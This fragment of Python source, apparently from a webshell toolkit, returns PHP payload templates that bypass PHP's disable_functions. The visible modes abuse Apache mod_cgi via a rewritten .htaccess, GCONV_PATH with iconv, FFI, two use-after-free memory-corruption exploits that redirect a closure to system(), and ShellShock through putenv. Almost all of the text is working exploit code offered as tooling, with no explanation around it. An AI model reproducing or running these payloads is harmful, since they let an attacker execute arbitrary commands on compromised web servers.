                        fwrite($accept, $ftp_table[$cmd]);
                        if ($cmd === "STOR") {
                            break;
                        }
                    } else {
                        break;
                    }
                }
                fclose($server);
                } else {
                die('stream_socket_server/stream_socket_accept function not exist');
                }"""
        }
    if bdf_mode == 11:  # apache_mod_cgi
        return """
            $cmd = base64_decode("%s");
                $shellcode = "#!/bin/sh\\n";
                $shellcode .= base64_decode("ZWNobyAtbmUgIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sXG5cbiIK");
                $shellcode .= "$cmd";
                $f=__DIR__.DIRECTORY_SEPARATOR."%s";
                rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess", __DIR__.DIRECTORY_SEPARATOR.".htaccess.bak");
                file_put_contents(__DIR__.DIRECTORY_SEPARATOR.'.htaccess', "Options +ExecCGI\\nAddHandler cgi-script .dh");
                file_put_contents($f, $shellcode);
                chmod($f, 0777);
                print($f);
            """
    if bdf_mode == 12:  # iconv
        return """$p="%s";
            putenv("GCONV_PATH=/tmp/");
            putenv("cmd=".base64_decode("%s"));
            putenv("rpath=$p");
            if(function_exists('iconv')){
                iconv("payload", "UTF-8", "whatever");
            } else if(function_exists('iconv_strlen')) {
                iconv_strlen("1","payload");
            } else if(function_exists('file_get_contents')){
              @file_get_contents("php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==");
            }else if (function_exists('fopen')){
              @fopen('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==','r');
            } else if (function_exists('readfile')){
              @readfile('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==');
            } else if (function_exists('file')) {
              @file('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==');
            } else if (function_exists('copy')) {
              @copy('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==',"/dev/null");
            } else if (class_exists('SplFileObject')) {
              new SplFileObject('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==');
            }
        """
    if bdf_mode == 13:  # FFI-php_exec
        return """
            $f=FFI::cdef("int php_exec(int type, char *cmd);");
            ob_start();$f->php_exec(3,base64_decode("%s"));$o=ob_get_contents();ob_end_clean();
            %s"""
    if bdf_mode == 14:  # php7-reflectionProperty
        return """global $abc, $helper;
                class Test {
                public HelperHelperHelperHelperHelperHelperHelper $prop;
                }
                class HelperHelperHelperHelperHelperHelperHelper {
                public $a, $b;
                }
                function s2n($str) {
                $address = 0;
                for ($i=0;$i<4;$i++){
                $address <<= 8;
                $address |= ord($str[4 + $i]);
                }
                return $address;
                }
                function s2b($str, $offset){
                return hex2bin(str_pad(dechex(s2n($str) + $offset - 0x10), 8, "0",
                STR_PAD_LEFT));
                }
                function leak($offset) {
                global $abc;
                $data = "";
                for ($i = 0;$i < 8;$i++){
                $data .= $abc[$offset + 7 - $i];
                }
                return $data;
                }
                function leak2($address) {
                global $helper;
                write(0x20, $address);
                $leak = strlen($helper -> b);
                $leak = dechex($leak);
                $leak = str_pad($leak, 16, "0", STR_PAD_LEFT);
                $leak = hex2bin($leak);
                return $leak;
                }
                function write($offset, $data) {
                global $abc;
                $data = str_pad($data, 8, "\\x00", STR_PAD_LEFT);
                for ($i = 0;$i < 8;$i++){
                $abc[$offset + $i] = $data[7 - $i];
                }
                }
                function get_basic_funcs($std_object_handlers) {
                $prefix = substr($std_object_handlers, 0, 4);
                $std_object_handlers = hexdec(bin2hex($std_object_handlers));
                $start = $std_object_handlers & 0x00000000fffff000 | 0x0000000000000920; # change 0x920 if finding failed
                $NumPrefix = $std_object_handlers & 0x0000ffffff000000;
                $NumPrefix = $NumPrefix - 0x0000000001000000;
                $funcs = get_defined_functions()['internal'];
                for($i = 0; $i < 0x1000; $i++) {
                $addr = $start - 0x1000 * $i;
                $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
                "0", STR_PAD_LEFT))));
                if (hexdec($name_addr) > $std_object_handlers || hexdec($name_addr) < $NumPrefix)
                {
                continue;
                }
                $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
                $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
                $name = explode("\\x00", $name)[0];
                if(in_array($name, $funcs)) {
                return [$name, bin2hex($prefix) . str_pad(dechex($addr), 8, "0", STR_PAD_LEFT),
                $std_object_handlers, $NumPrefix];
                }
                }
                }
                function getSystem($unknown_func) {
                $unknown_addr = hex2bin($unknown_func[1]);
                $prefix = substr($unknown_addr, 0, 4);
                $unknown_addr = hexdec($unknown_func[1]);
                $start = $unknown_addr & 0x00000000ffffffff;
                for($i = 0;$i < 0x800;$i++) {
                $addr = $start - 0x20 * $i;
                $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
                "0", STR_PAD_LEFT))));
                if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <
                $unknown_func[3]) {
                continue;
                }
                $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
                $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
                if(strstr($name, "system")) {
                return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,
                "0", STR_PAD_LEFT))));
                }
                }
                for($i = 0;$i < 0x800;$i++) {
                $addr = $start + 0x20 * $i;
                $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
                "0", STR_PAD_LEFT))));
                if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <
                $unknown_func[3]) {
                continue;
                }
                $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
                $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
                if(strstr($name, "system")) {
                return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,
                "0", STR_PAD_LEFT))));
                }
                }
                }
                $rp = new ReflectionProperty(Test::class, 'prop');
                $test = new Test;
                $test -> prop = new HelperHelperHelperHelperHelperHelperHelper;
                $abc = $rp -> getType() -> getName();
                $helper = new HelperHelperHelperHelperHelperHelperHelper();
                if (strlen($abc) < 1000) {
                exit("UAF Failed!");
                }
                $helper -> a = $helper;
                $php_heap = leak(0x10);
                $helper -> a = function($x){};
                $std_object_handlers = leak(0x0);
                $prefix = substr($php_heap, 0, 4);

                $closure_object = leak(0x10);

                write(0x28, "\\x06");
                if(!($unknown_func = get_basic_funcs($std_object_handlers))) {
                die("Couldn't determine funcs address");
                }
                //echo "Find func's adress: " . $unknown_func[1] . " -> " . $unknown_func[0] . "\\n";
                if(!($system_address = getSystem($unknown_func))) {
                die("Couldn't determine system address");
                }

                for ($i = 0;$i < (0x130 / 0x08);$i++) {
                write(0x308 + 0x08 * ($i + 1), leak2($prefix . s2b($closure_object, 0x08 *
                $i)));
                }
                $abc[0x308 + 0x40] = "\\x01";
                write(0x308 + 0x70, hex2bin($system_address));
                write(0x10, $prefix . hex2bin(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08)));

                ob_start();
                ($helper -> a)(base64_decode("%s"));
                $o=ob_get_contents();
                ob_end_clean();
        %s"""
    if bdf_mode == 15:  # php-user_filter
        return """
        function pwn($cmd) {
            define('LOGGING', false);
            define('CHUNK_DATA_SIZE', 0x60);
            define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);
            define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50);
            define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1);
            define('CMD', $cmd);
            for($i = 0; $i < 10; $i++) {
                $groom[] = Pwn::alloc(STRING_SIZE);
            }
            stream_filter_register('pwn_filter', 'Pwn');
            $fd = fopen('php://memory', 'w');
            stream_filter_append($fd,'pwn_filter');
            fwrite($fd, 'x');
        }

        class Helper { public $a, $b, $c; }
        class Pwn extends php_user_filter {
            private $abc, $abc_addr;
            private $helper, $helper_addr, $helper_off;
            private $uafp, $hfp;

            public function filter($in, $out, &$consumed, $closing) {
                if($closing) return;
                stream_bucket_make_writeable($in);
                $this->filtername = Pwn::alloc(STRING_SIZE);
                fclose($this->stream);
                $this->go();
                return PSFS_PASS_ON;
            }

            private function go() {
                $this->abc = &$this->filtername;

                $this->make_uaf_obj();

                $this->helper = new Helper;
                $this->helper->b = function($x) {};

                $this->helper_addr = $this->str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;

                $this->abc_addr = $this->helper_addr - CHUNK_SIZE;

                $this->helper_off = $this->helper_addr - $this->abc_addr - 0x18;

                $helper_handlers = $this->str2ptr(CHUNK_SIZE);

                $this->prepare_leaker();

                $binary_leak = $this->read($helper_handlers + 8);
                $this->prepare_cleanup($binary_leak);

                $closure_addr = $this->str2ptr($this->helper_off + 0x38);

                $closure_ce = $this->read($closure_addr + 0x10);

                $basic_funcs = $this->get_basic_funcs($closure_ce);

                $zif_system = $this->get_system($basic_funcs);

                $fake_closure_off = $this->helper_off + CHUNK_SIZE * 2;
                for($i = 0; $i < 0x138; $i += 8) {
                    $this->write($fake_closure_off + $i, $this->read($closure_addr + $i));
                }
                $this->write($fake_closure_off + 0x38, 1, 4);

                $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
                $this->write($fake_closure_off + $handler_offset, $zif_system);

                $fake_closure_addr = $this->helper_addr + $fake_closure_off - $this->helper_off;
                $this->write($this->helper_off + 0x38, $fake_closure_addr);

                $this->cleanup();
                ($this->helper->b)(CMD);
            }

            private function make_uaf_obj() {
                $this->uafp = fopen('php://memory', 'w');
                fwrite($this->uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE));
                for($i = 0; $i < STRING_SIZE; $i++) {
                    fwrite($this->uafp, "\\x00");
                }
            }

            private function prepare_leaker() {
                $str_off = $this->helper_off + CHUNK_SIZE + 8;
                $this->write($str_off, 2);
                $this->write($str_off + 0x10, 6);

                $val_off = $this->helper_off + 0x48;
                $this->write($val_off, $this->helper_addr + CHUNK_SIZE + 8);
                $this->write($val_off + 8, 0xA);
            }

            private function prepare_cleanup($binary_leak) {
                $ret_gadget = $binary_leak;
                do {
                    --$ret_gadget;
                } while($this->read($ret_gadget, 1) !== 0xC3);
                $this->write(0, $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));
                $this->write(8, $ret_gadget);
            }

            private function read($addr, $n = 8) {
                $this->write($this->helper_off + CHUNK_SIZE + 16, $addr - 0x10);
                $value = strlen($this->helper->c);
                if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
                return $value;
            }

            private function write($p, $v, $n = 8) {
                for($i = 0; $i < $n; $i++) {
                    $this->abc[$p + $i] = chr($v & 0xff);
                    $v >>= 8;
                }
            }

            private function get_basic_funcs($addr) {
                while(true) {
                    $addr -= 0x10;
                    if($this->read($addr, 4) === 0xA8 &&
                        in_array($this->read($addr + 4, 4),
                            [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) {
                        $module_name_addr = $this->read($addr + 0x20);
                        $module_name = $this->read($module_name_addr);
                        if($module_name === 0x647261646e617473) {
                            return $this->read($addr + 0x28);
                        }
                    }
                }
            }

            private function get_system($basic_funcs) {
                $addr = $basic_funcs;
                do {
                    $f_entry = $this->read($addr);
                    $f_name = $this->read($f_entry, 6);
                    if($f_name === 0x6d6574737973) {
                        return $this->read($addr + 8);
                    }
                    $addr += 0x20;
                } while($f_entry !== 0);
            }

            private function cleanup() {
                $this->hfp = fopen('php://memory', 'w');
                fwrite($this->hfp, pack('QQ', 0, $this->abc_addr));
                for($i = 0; $i < FILTER_SIZE - 0x10; $i++) {
                    fwrite($this->hfp, "\\x00");
                }
            }

            private function str2ptr($p = 0, $n = 8) {
                $address = 0;
                for($j = $n - 1; $j >= 0; $j--) {
                    $address <<= 8;
                    $address |= ord($this->abc[$p + $j]);
                }
                return $address;
            }

            private function ptr2str($ptr, $n = 8) {
                $out = '';
                for ($i = 0; $i < $n; $i++) {
                    $out .= chr($ptr & 0xff);
                    $ptr >>= 8;
                }
                return $out;
            }


            static function alloc($size) {
                return str_shuffle(str_repeat('A', $size));
            }
        }
        ob_start();
        pwn(base64_decode("%s"));
        $o=ob_get_contents();
        ob_end_clean();
        %s
        """
    if bdf_mode == 16:  # ShellShock
        return """
            function shellshock($cmd) {
                if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
                    $p="/tmp/%s";
                    putenv("PHP_LOL=() { x; }; $cmd > $p 2>&1");
                    %s
                    echo @file_get_contents($p);
                    @unlink($p);
                }
            }
            ob_start();
            shellshock(base64_decode("%s"));
            $o=ob_get_contents();
            ob_end_clean();
            %s
        """
